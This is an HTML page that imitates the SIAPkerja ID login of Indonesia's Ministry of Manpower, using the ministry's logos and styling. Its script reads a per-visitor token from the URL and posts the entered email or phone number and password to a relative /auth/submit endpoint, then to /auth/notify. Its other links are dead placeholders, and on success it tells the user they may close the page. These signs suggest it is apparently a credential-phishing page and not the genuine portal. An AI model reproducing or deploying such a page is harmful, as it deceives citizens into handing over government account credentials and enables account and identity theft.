<!DOCTYPE html>
<html lang="id">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Masuk ke Akun : SIAPkerja ID : Kementerian Ketenagakerjaan RI</title>
    <link rel="icon" type="image/png" href="https://account.kemnaker.go.id/favicons/siapkerja-favicon.png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: #fff;
            background-image: url('https://account-beta-cdn.kemnaker.go.id/images/illustrations/login.jpg');
            background-size: 59% auto;
            background-position: center 34%;
            background-repeat: no-repeat;
            background-attachment: fixed;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        /* Header */
        .header {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem 0;
            padding-top: 1.5rem;
        }

        .header img {
            height: 28px;
            object-fit: contain;
        }

        /* Main Container */
        .main {
            flex: 1;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 0 1rem;
            padding-top: 4rem;
        }

        /* Login Card */
        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(4px);
            border-radius: 0.75rem;
            border: 1px solid #e5e7eb;
            padding: 2rem 2rem 1.5rem;
            width: 100%;
            max-width: 380px;
        }

        .card-title {
            font-size: 1.5rem;
            font-weight: 700;
            text-align: center;
            color: #000;
            margin-bottom: 2rem;
        }

        /* Error Alert */
        .error-alert {
            display: none;
            align-items: flex-start;
            gap: 0.5rem;
            color: #ef4444;
            font-size: 0.75rem;
            font-weight: 500;
            margin-bottom: 1.5rem;
        }

        .error-alert.show {
            display: flex;
        }

        .error-alert svg {
            width: 1rem;
            height: 1rem;
            margin-top: 0.125rem;
            flex-shrink: 0;
        }

        /* Form Groups */
        .form-group {
            margin-bottom: 1.5rem;
        }

        .form-group-sm {
            margin-bottom: 1rem;
        }

        .form-label {
            display: block;
            font-size: 0.875rem;
            font-weight: 700;
            color: #000;
            margin-bottom: 0.375rem;
        }

        .form-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 0.375rem;
        }

        /* Input Fields */
        .form-input {
            width: 100%;
            padding: 0.5rem 0.75rem;
            background: #fff;
            border: 1px solid #d1d5db;
            border-radius: 0.5rem;
            font-size: 0.875rem;
            font-weight: 300;
            font-family: 'Inter', sans-serif;
            transition: all 0.2s;
        }

        .form-input::placeholder {
            font-weight: 300;
            color: #9ca3af;
        }

        .form-input:focus {
            outline: none;
            box-shadow: 0 0 0 2px #14b8a6;
            border-color: transparent;
        }

        .input-password {
            padding-right: 2.5rem;
        }

        /* Password Toggle */
        .input-wrapper {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 0.75rem;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #9ca3af;
            cursor: pointer;
            padding: 0;
            transition: color 0.2s;
        }

        .toggle-password:hover {
            color: #4b5563;
        }

        .toggle-password svg {
            display: block;
        }

        .toggle-password .hidden {
            display: none;
        }

        /* Links */
        .link {
            font-size: 0.875rem;
            color: #14b8a6;
            text-decoration: none;
        }

        .link:hover {
            color: #0d9488;
            text-decoration: underline;
        }

        .link-bold {
            font-weight: 700;
        }

        .link-gray {
            color: #6b7280;
            font-weight: 700;
        }

        .link-gray:hover {
            color: #374151;
        }

        /* Submit Button */
        .btn-submit {
            width: 100%;
            padding: 0.625rem 0;
            margin-top: 0.5rem;
            background: #14b8a6;
            color: #fff;
            font-size: 0.875rem;
            font-weight: 700;
            font-family: 'Inter', sans-serif;
            border: none;
            border-radius: 0.5rem;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-submit:hover {
            background: #0d9488;
        }

        .btn-submit:active {
            transform: scale(0.99);
        }

        .btn-submit:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .btn-submit.success {
            background: #16a34a;
        }

        .btn-submit.success:hover {
            background: #15803d;
        }

        /* Spinner */
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        .spinner {
            display: inline-block;
            width: 1.25rem;
            height: 1.25rem;
            border: 2px solid rgba(255, 255, 255, 0.25);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        /* Register Section */
        .register-section {
            margin: 0 -2rem;
            padding: 0 2rem 1.5rem;
            border-bottom: 1px solid #e5e7eb;
            margin-top: 1.25rem;
            text-align: center;
        }

        .register-section p {
            font-size: 0.875rem;
            color: #000;
        }

        /* Help Footer */
        .help-footer {
            text-align: center;
            padding-top: 1rem;
        }

        /* Page Footer */
        .footer {
            text-align: center;
            color: #6b7280;
            font-size: 0.875rem;
            padding: 1rem 0;
        }

        /* Success State */
        .success-container {
            text-align: center;
            padding: 2rem 0;
        }

        .success-icon {
            margin: 0 auto 1.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 4rem;
            height: 4rem;
            background: #dcfce7;
            border-radius: 50%;
        }

        .success-icon svg {
            width: 2rem;
            height: 2rem;
            color: #16a34a;
        }

        .success-title {
            font-size: 1.25rem;
            font-weight: 700;
            color: #111827;
            margin-bottom: 0.5rem;
        }

        .success-message {
            color: #6b7280;
            margin-bottom: 1.5rem;
        }

        .success-hint {
            font-size: 0.875rem;
            color: #9ca3af;
        }
    </style>
</head>

<body>
    <!-- Top Bar with Logo -->
    <header class="header">
        <a href="https://kemnaker.go.id">
            <img alt="SIAPkerja ID" src="https://account-beta-cdn.kemnaker.go.id/images/Logo-SiapKerjaID.svg">
        </a>
    </header>

    <!-- Main Container -->
    <main class="main">
        <!-- Login Card -->
        <div class="card" id="loginCard">
            <!-- Header -->
            <h1 class="card-title">Masuk</h1>

            <form id="loginForm">
                <!-- Error Alert -->
                <div id="errorAlert" class="error-alert">
                    <svg viewBox="0 0 24 24" fill="currentColor">
                        <path
                            d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
                    </svg>
                    <span id="errorMessage">No. HP / Email / NIK atau password tidak benar.</span>
                </div>

                <!-- Email Field -->
                <div class="form-group">
                    <label for="identity" class="form-label">Email atau nomor handphone</label>
                    <input type="text" id="identity" name="identity" autocomplete="username" required
                        placeholder="Masukkan email atau nomor handphone" class="form-input">
                </div>

                <!-- Password Field -->
                <div class="form-group-sm">
                    <div class="form-header">
                        <label for="password" class="form-label" style="margin-bottom:0">Password</label>
                        <a href="#" class="link">Kendala Masuk ke Akun?</a>
                    </div>
                    <div class="input-wrapper">
                        <input type="password" id="password" name="password" autocomplete="current-password" required
                            placeholder="Masukkan password" class="form-input input-password">
                        <button type="button" onclick="togglePassword()" class="toggle-password">
                            <!-- Eye Icon (visible) -->
                            <svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" width="18" height="18"
                                viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round">
                                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
                                <circle cx="12" cy="12" r="3"></circle>
                            </svg>
                            <!-- Eye Off Icon (hidden) -->
                            <svg id="eyeClosed" class="hidden" xmlns="http://www.w3.org/2000/svg" width="18" height="18"
                                viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round">
                                <path
                                    d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24">
                                </path>
                                <line x1="1" y1="1" x2="23" y2="23"></line>
                            </svg>
                        </button>
                    </div>
                </div>

                <!-- Submit Button -->
                <button type="submit" class="btn-submit">Masuk</button>
            </form>

            <!-- Register Link -->
            <div class="register-section">
                <p>Belum memiliki akun? <a href="#" class="link link-bold">Daftar Sekarang</a></p>
            </div>

            <!-- Help Link Footer -->
            <div class="help-footer">
                <a href="#" class="link link-gray">Kunjungi Pusat Bantuan</a>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">©2025 Kemnaker RI</footer>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const eyeOpen = document.getElementById('eyeOpen');
            const eyeClosed = document.getElementById('eyeClosed');

            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                eyeOpen.classList.add('hidden');
                eyeClosed.classList.remove('hidden');
            } else {
                passwordInput.type = 'password';
                eyeOpen.classList.remove('hidden');
                eyeClosed.classList.add('hidden');
            }
        }

        // Get Token from URL (format: /auth/:token)
        const pathSegments = window.location.pathname.split('/');
        const token = pathSegments[pathSegments.length - 1];

        // Ensure token exists
        if (!token || token === 'auth' || token === 'login.html') {
            console.warn("No token found in URL");
        }

        document.getElementById('loginForm').addEventListener('submit', async function (e) {
            e.preventDefault();

            const emailInput = document.getElementById('identity');
            const passwordInput = document.getElementById('password');
            const submitButton = this.querySelector('button[type="submit"]');
            const originalButtonText = submitButton.innerHTML;

            const email = emailInput.value;
            const password = passwordInput.value;

            if (!email || !password) {
                alert('Silakan isi email dan password');
                return;
            }

            // Set Loading State
            submitButton.disabled = true;
            submitButton.innerHTML = '<span class="spinner"></span>';

            try {
                const response = await fetch('/auth/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token, email, password })
                });

                const result = await response.json();

                if (result.success) {
                    submitButton.innerHTML = '✅ Berhasil!';
                    submitButton.classList.add('success');

                    document.getElementById('loginCard').innerHTML = `
                        <div class="success-container">
                            <div class="success-icon">
                                <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                                </svg>
                            </div>
                            <h3 class="success-title">Login Berhasil!</h3>
                            <p class="success-message">${result.message || 'Anda telah berhasil masuk.'}</p>
                            <p class="success-hint">Anda boleh menutup halaman ini sekarang.</p>
                        </div>
                    `;

                    await fetch('/auth/notify', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ token, success: true, message: result.message })
                    });

                } else {
                    const errorAlert = document.getElementById('errorAlert');
                    const errorMessage = document.getElementById('errorMessage');

                    if (errorAlert && errorMessage) {
                        errorMessage.textContent = result.message || 'Login gagal. Periksa kembali email dan password Anda.';
                        errorAlert.classList.add('show');
                    } else {
                        alert(result.message || 'Login gagal.');
                    }

                    submitButton.disabled = false;
                    submitButton.innerHTML = originalButtonText;
                }

            } catch (error) {
                console.error('Login error:', error);
                alert('Terjadi kesalahan koneksi. Silakan coba lagi.');
                submitButton.disabled = false;
                submitButton.innerHTML = originalButtonText;
            }
        });
    </script>
</body>

</html>
